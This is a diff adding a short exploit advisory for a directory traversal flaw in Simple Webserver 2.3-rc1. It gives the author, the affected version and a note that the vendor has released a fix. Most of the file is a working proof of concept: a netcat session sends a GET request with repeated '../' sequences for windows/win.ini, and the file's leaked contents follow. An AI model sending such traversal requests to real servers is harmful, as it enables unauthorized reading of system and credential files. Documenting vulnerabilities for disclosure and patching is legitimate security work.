@@ -1,0 +1,61 @@
+# Exploit Title: Simple Webserver 2.3-rc1 Directory Traversal
+# Date: 01/02/2013
+# Exploit Author: CwG GeNiuS
+# Vendor Homepage: http://www.pmx.it
+# Software Link: http://www.pmx.it/download/sws-2.3-rc1-i686.exe
+# Version: 2.3-rc1 (and earlier)
+# Tested on: Windows 7 Enterprise SP1
+#
+#Vulnerability: When removing the preceding "/" from a GET 
+#			request the webserver allows directory 	
+#			traversal.
+#
+#Fix: I have spoken with the developer who has now 
+#	released 2.3-rc2 to correct the vulnerability
+
+
+
+root@bt:~# nc -v 192.168.1.132 80
+192.168.1.132: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.1.132] 80 (www) open
+GET ../../../../../../../../windows/win.ini http/1.1
+
+HTTP/1.1 400 Bad Request
+Server: PMSoftware-SWS/2.3
+Date: Wed, 02 Jan 2013 22:45:2 GMT
+Connection: close
+
+HTTP/1.1 200 Ok
+Server: PMSoftware-SWS/2.3
+Date: Wed, 02 Jan 2013 22:45:2 GMT
+Accept-Ranges: bytes
+Content-type: 
+Content-Length: 403
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
